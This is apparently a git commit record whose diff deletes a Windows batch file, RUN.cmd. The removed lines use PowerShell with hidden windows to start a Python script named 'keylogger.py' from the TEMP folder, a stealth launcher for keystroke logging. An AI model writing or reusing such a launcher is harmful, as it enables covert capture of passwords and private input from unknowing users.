5986eaf1f8e83cb670e5b6a25ae66ecaed030419
Michelangelo <tigerlesenko@gmail.com>
2026-02-08 13:12:07 +0100

    Delete RUN.cmd

--- RUN.cmd
+++
@@ -1,6 +0,0 @@
-@echo off
-set "SCRIPT_PATH=%TEMP%\keylogger.py"
-
-powershell -NoProfile -WindowStyle Hidden -Command ^
-    "Start-Process python -ArgumentList '\"%SCRIPT_PATH%\"' -WindowStyle Hidden"
-exit
